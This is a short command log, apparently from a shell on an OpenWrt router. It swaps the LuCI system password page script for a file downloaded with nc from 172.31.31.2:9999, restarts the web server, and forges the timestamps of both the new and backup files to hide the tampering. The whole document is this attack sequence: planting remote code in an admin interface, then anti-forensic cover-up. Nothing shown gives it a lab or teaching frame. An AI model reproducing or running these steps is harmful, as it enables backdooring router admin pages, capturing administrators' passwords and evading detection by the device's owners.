cd /www/luci-static/resources/view/system
mv password.js password.js.bak
nc 172.31.31.2 9999 > password.js
exec ash
service uhttpd restart
touch --reference reboot.js password.js
touch --reference reboot.js password.js.bak
exit

